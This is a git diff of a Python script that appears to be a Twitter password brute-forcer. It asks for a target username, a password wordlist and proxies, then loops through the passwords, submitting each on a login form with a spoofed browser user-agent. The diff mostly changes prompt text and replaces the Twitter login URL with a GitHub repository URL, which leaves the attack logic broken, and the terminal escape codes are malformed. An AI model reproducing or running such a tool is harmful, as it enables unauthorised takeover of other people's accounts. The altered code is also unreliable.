@@ -46,8 +46,8 @@ b.addheaders = [('User-agent',
                  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
                  )]
 
-username = input('\033[1;DARKTECH : \033[1;37m')
-passwordList = input('\033[1; PASSWORD45 : \033[1;37m')
+username = input('\033[1;DARKTECH: \033[1;37m')
+passwordList = input('\033[1;PASSWORD45: \033[1;37m')
 proxyList = input('\033[1;37mproxy : \033[1;37m')
 def proxy():
     logging.basicConfig()
@@ -68,14 +68,14 @@ def proxy():
 def Twitter():
     password = open(passwordList).read().splitlines()
     try_login = 0
-    print("\033[1;31mTarget Account: {}\033[1;31m".format(username))
+    print("\033[1;DARKTECH Account: {}\033[1;31m".format(username))
     for password in password:
         try_login += 1
         if try_login == 10:
             try_login = 0
         sys.stdout.write('\r[-] {} [-] '.format(password))
         sys.stdout.flush()
-        url = "https://mobile.twitter.com/login"
+        url = "https://github.com/Jaydendev112/Tweeter-py-hack"
         try:
             response = b.open(url, timeout=2)
             b.select_form(nr=0)
